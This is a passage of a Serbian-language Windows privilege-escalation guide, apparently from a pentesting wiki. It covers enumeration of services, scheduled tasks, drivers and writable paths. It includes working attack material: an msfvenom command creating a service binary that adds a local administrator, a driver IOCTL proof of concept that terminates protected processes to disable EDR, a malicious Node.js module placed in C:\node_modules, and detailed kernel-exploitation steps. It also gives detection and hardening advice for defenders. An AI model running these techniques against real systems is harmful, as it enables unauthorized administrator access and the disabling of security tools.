Izlistajte sve unquoted service paths, izuzimajući one koji pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću Metasploit-a: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati izvršnu datoteku servisa pomoću Metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija može da se podesi tako da upućuje na binarnu datoteku. Ako je moguće zameniti tu datoteku, možda je moguća eskalacija privilegija. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti zakazanih zadataka

Za omogućen zadatak koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi i za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell `-File`, proverite i ACL navedene skripte; promenljive, uslovi i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje ukazuju na moguću izvršnu radnju između naloga samo kada se konfigurisani principal zadatka razlikuje od pozivaoca i zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje podataka može biti bitan za skripte, ali raniji `exit` ili drugi tok izvršavanja mogu onemogućiti pristup naknadno dodatim linijama. Pre nego što tvrdite da je moguća eskalacija, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Inventarisanje ne sme da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u pristupačnim datotekama

Na NTFS-u, čitljiva datoteka može imati imenovani `:$DATA` tok čiji sadržaj nije prikazan u uobičajenom spisku direktorijuma. Za mali, relevantan skup pristupačnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre otvaranja njihovog sadržaja; Windows im omogućava pristup preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji nagoveštava da sadrži tajnu samo je trag. Proverite efektivna prava čitanja datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista odnose. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom uobičajenog popisivanja.

## Ulazi pomoćnog programa iz Windows Driver Kita koji pokreće zakazani zadatak

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektnu datoteku `working\rsf.rsf` iz svog direktorijuma za pokretanje. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da omogući izvršavanje komandi u kontekstu tog naloga ako korisnik sa niskim privilegijama može da upisuje u te ulazne datoteke, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da privilegovani proces zaista koristi te datoteke i da je moguće kreirati ili menjati **obe** prateće datoteke; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka, proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove putanja do dve prateće datoteke. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz o tome odakle zadatak čita ulazne datoteke. Mora biti ispunjen i preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka, umesto da pretpostavite da se pokreće kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Checkmk Windows agenta

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Checkmk Windows agente koji su zapisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisa kada zamena ne bi uspela. Proizvođač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite tačan instalirani nivo zakrpe i da li se može pokrenuti pogođena operacija agenta; oznaka grane kao što je `2.1` nije dovoljna da bi se utvrdila izloženost. Enumeracijom se mogu proveriti verzija, stanje servisa i dozvole za Temp, bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) je uticao na ADSelfService Plus verzije 6210 i starije; proizvođač je ispravio problem u verziji 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Zato su zapis o instaliranom proizvodu ili putanja servisa samo naznaka, a ne potvrda ranjivosti: proverite tačnu verziju, istoriju SAML konfiguracije, dostupnost servisa preko mreže i nalog pod kojim se pokreće. Izvršavanje koda preko servisa koristi privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Čitljiva датотека `OfflineBackup_*.ezip` у директоријуму Backup производа представља засебну наznaku za šifrovanu rezervnu kopiju, a ne dokaz da sadrži upotrebljive akreditive ili da postoji ovaj SAML propust. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Granice između Jenkins kontrolera i domen naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu ponuditi drugi način pokretanja izgradnje, ali proverite da li su omogućeni i da li se izgradnja zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani akreditiv može da se koristi samo ako posao ima pristup njegovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva akreditive i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnim datotekama** i zasebnu mogućnost ponovne upotrebe naloga, bez ispisivanja tajni u zajednički izlaz. Ako taj nalog ima pravo upisa u `scriptPath` AD korisničkog objekta, pre nego što to smatrate izvršavanjem u kontekstu drugog korisnika, proverite da li je putanja skripte upisiva i da li postoji stvarni logon ili zakazani proces koji je koristi i radi kao ciljni korisnik. Dodatnu kontrolu nad grupom treba potvrditi zasebnom proverom efektivnih AD prava.

#### Identitet self-hosted agenta Azure Pipelines

Za projekat Azure DevOps Server ili Azure Pipelines razlikujte dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red čekanja** i korišćenje izabranog skupa agenata; [Microsoft zasebno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju skupa agenata](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje korak skripte i pokrene taj pipeline na self-hosted Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre nego što tvrdite da dolazi do prelaska na drugog korisnika ili SYSTEM, proverite tačan pipeline, ograničenja grane/resursa, autorizovani skup agenata, posao koji može da se pokrene i identitet servisnog naloga agenta. Instalirani agent, projektna uloga ili dozvola za upis u repozitorijum samo su naznake; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa, ali nemojte pokretati izgradnju.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **ADSync servisnog naloga**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, i **naloga AD DS konektora**, čije dozvole u direktorijumu zavise od konfigurisanih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI-ja u kontekstu ADSync servisnog naloga](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Samo prisustvo instaliranog servisa za sinhronizaciju, grupe čiji naziv zvuči kao da ima lokalna administratorska prava ili vidljivost baze podataka ne dokazuje da akreditiv može da se dešifruje niti da je moguća eskalacija privilegija u domenu. Zasebno proverite stvarna prava za čitanje baze podataka, pristup servisnom nalogu i ključevima, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikaže samo metapodatke o servisu i pristupu, a ne da ispituje ili ispisuje sačuvane tajne.

#### Dozvole za pomoćne DLL datoteke upravljačkog programa štampača

Instalirani upravljački program štampača može da čuva pomoćne DLL datoteke u `C:\ProgramData` i da ih učitava u privilegovanijem procesu za štampanje. Proverite ACL-ove tačnog direktorijuma upravljačkog programa i DLL datoteka, uključujući nadređene direktorijume i tačke ponovnog analiziranja, čak i ako je enumeracija štampača putem WMI-ja onemogućena. Za [problem sa upravljačkim programom Ricoh štampača CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), navedena putanja je bila `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [originalno obaveštenje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL datoteke pomoću `PrintIsolationHost.exe`. ACL koji dozvoljava upis samo je naznaka: proverite efektivni pristup za upis nakon primene unosa za uskraćivanje, da li je relevantni upravljački program instaliran i učitava datoteku pod privilegovanim identitetom, kao i da li je proizvođač ažuriranim upravljačkim programom ili bezbednosnim programom ispravio instalaciju. Nemojte zaključivati da postoji ranjivost samo na osnovu naziva direktorijuma ili verzije upravljačkog programa.

### Dozvole za upis

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali posebnu datoteku ili da li možete da izmenite binarnu datoteku koju će izvršiti Administrator nalog (zakazani zadaci).

Slabе dozvole за директоријуме/датотеке у систему можете потражити на следећи начин:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload: postojanost/izvršavanje

Notepad++ automatski učitava svaki plugin DLL u svojim podfolderima `plugins`. Ako postoji upisiva prenosiva/kopirana instalacija, dodavanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i povratnih poziva plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju

**Proverite da li možete da prepišete neki registry ključ ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže proizvoljnu kernel read/write primitivu (što je često slučaj kod loše projektovanih IOCTL handlera), možete eskalirati privilegije tako što ćete direktno ukrasti SYSTEM token iz kernel memorije.<sup>[[13]](#references)</sup> Tehniku korak po korak pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kod race-condition grešaka u kojima ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF greške u cancel-safe redovima, otkrivanje paged-pool memorije i I/O ring prečice

Neki Windows kernel LPE lanci mogu se izgraditi od dve zasebno slabe greške: **race condition u životnom veku cancel-safe reda** koja oslobađa zahtev/CBD dok je lock reda i dalje zaključan, i otkrivanje podataka zbog **oslobađanja lock-a pre kopiranja** koje otkriva oslobođenu paged-pool alokaciju tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Beleške o analizi i eksploataciji:

- **Oslobađanje pod lock-om + naknadni cancel**: potražite success putanju koja radi **Acquire -> CompleteRequest/free -> Release**, dok cancel putanja radi **Acquire -> RemoveIo(zastareli pokazivač) -> Release -> CompleteCanceledIo**. Ako success putanja dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre nego što oslobodi CBDQ/CSQ lock, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije nastaviti i proslediti oslobođeni `PFLT_CALLBACK_DATA` driverovom callback-u za uklanjanje.
- **Ponovo zauzmite oslobođeni queue objekat** paged-pool alokacijom iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer su payload i veličina pod vašom kontrolom, a kasnije ih možete ispitivati pipe read/peek operacijama. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličkom listom lažnih request node-ova u user memoriji**, tako da driver opetovano obrađuje strukture zahteva koje definiše napadač umesto da završi na originalnoj glavi liste.
- **Nadogradite predvidiv upis**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za bookkeeping upise (timestamps / QPC / polja uz refcount), možda ćete dobiti kernel upis čija je **adresa pod vašom kontrolom, ali ne i vrednost**. U tom slučaju, ciljajte polje **length/size** objekta iz pool spray-a umesto konačnog code/data pointer-a, pa isprobavajte objekte iz spray-a dok oštećeni objekat ne omogući **out-of-bounds čitanje iz paged-pool memorije**.
- **Obrazac za otkrivanje podataka podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` je dobar kandidat. Pouzdanost se poboljšava kada napadač može da poveća kopirani bafer (na primer dodavanjem mnogo list/resource unosa koji povećavaju konačnu veličinu serijalizovane alokacije), jer duže kopiranje proširuje prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za dopunu bogati pokazivačima**: registrovani baferi Windows **I/O ring-a** odlični su ciljevi za otkrivanje podataka jer je njihova paged-pool veličina pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`** kako bi naknadne I/O ring operacije koristile lažиране уносе под контролом нападача и омогућиле произвољно kernel read/write. Ако једини доступан упис даје стабилан бајт (на пример из `KUSER_SHARED_DATA+0x14`), користите **преклапајуће неусклађене уписе** да изградите кориснички показивач који се понавља, као што је `0x0101010101010101`, мапирајте га помоћу `VirtualAlloc` и тамо поставите лажни низ регистрованих бафера.<sup>[[30]](#references)</sup>

Корисни индикатори за отклањање грешака:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz oštećenog I/O ring-a dobijete proizvoljan kernel read/write, ukradite SYSTEM token koristeći standardni post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za oštećenje memorije hive-a registra

Savremene ranjivosti hive-ova omogućavaju pripremu determinističkih rasporeda, zloupotrebu potomaka HKLM/HKU u koje je moguće upisivati i pretvaranje oštećenja metapodataka u prelivanja kernel paged pool-a bez prilagođenog drajvera. Ceo lanac možete proučiti ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zabuna tipova u direktnom režimu `RtlQueryRegistryValues` usled putanja koje kontroliše napadač

Neki drajveri prihvataju putanju registra iz userland-a, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i prosleđuju pokazivač na skalarnu vrednost na steku, kao što je `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne tipu koji je programer očekivao.

Ovo omogućava dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zloupotreba ovlašćenog posrednika / oracle**: apsolutna putanja `\Registry\...` koju kontroliše korisnik omogućava drajveru da pretražuje ključeve koje je izabrao napadač, otkriva njihovo postojanje kroz povratne kodove/zapise i ponekad čita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Oštećenje kernel memorije**: odredište za skalarnu vrednost, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Napomene za praktičnu eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit pogodi **untrusted hive** uz `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela izazivaju pad sa greškom `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, potražite **ključeve unutar trusted system hive-ova u koje napadač može da upisuje**, umesto da postavljate vrednosti pod `HKCU`.
- **Postavljanje vrednosti u trusted hive**: koristite NtObjectManager da pronađete potomke `\Registry\Machine` u koje je moguće upisivati, a zatim ponovo pokrenite skeniranje sa dupliranim **low-integrity** tokenom da biste pronašli ključeve dostupne iz sandbox-ovanih okruženja:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita napadačev `REG_DWORD` u skalarni element steka, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo korišćenom skalarnom elementu, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku, što je često najjednostavniji način da se potpuno prepiše pokazivač na callback.

Efikasan obrazac za pronalaženje: **raznorodna čitanja iz registra u istu promenljivu na steku, bez njene ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo korišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba izostanka FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju svoj objekat uređaja sa jakim SDDL-om koristeći IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u `DeviceCharacteristics`. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaju pristupa putem putanje koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle korišćenjem putanje prostora imena kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje drajver izlaže mogu se zloupotrebiti za LPE i neovlašćene izmene. Primeri mogućnosti uočenih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upisivanje sirovog diska (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), čime se omogućava gašenje AV/EDR-a iz korisničkog prostora preko kernela.

Minimalni PoC obrazac (korisnički režim):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigacije za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekidanje procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele posredovanja umesto direktnih privilegija kernela.

Ideje za detekciju za odbrambene timove
- Pratite otvaranja sumnjivih naziva uređaja iz user-mode-a (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/blokiranih.


## PATH DLL Hijacking

Ako imate **dozvole za upis u fasciklu koja se nalazi na PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako zloupotrebiti ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windowsu** koja utiče na aplikacije **Node.js** i **Electron** kada izvrše goli import, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node razrešava pakete penjući se kroz stablo direktorijuma i proveravajući fascikle `node_modules` u svakom nadređenom direktorijumu. U Windowsu, to penjanje može stići do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može pokušati da pronađe:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo postaje **LPE** kad god se cilj pokreće kao administrator, iz povišenog zakazanog zadatka/servisnog omotača ili iz automatski pokrenute privilegovane desktop aplikacije.

Ovo se naročito često dešava kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja sa radom nakon greške
- je paket uklonjen iz produkcionih buildova, izostavljen tokom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, Electron EXE aplikacije ili proces omotača)
- Filtrirajte po `Path` koji `contains` `node_modules`
- Usredsredite se na `NAME NOT FOUND` i poslednje uspešno otvaranje unutar `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte osnovni direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul pod tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionalnih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje zaštite

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve runtime zavisnosti u paket i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana i potražite obrasce `try { require("...") } catch {}` koji ne prijavljuju greške.
- Onemogućite opcionalne provere kada ih biblioteka podržava (na primer, neka `ws` okruženja mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts fajl

Proverite da li su u hosts fajlu hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite **ograničene usluge** spolja.

```bash
netstat -ano #Opened ports?
```

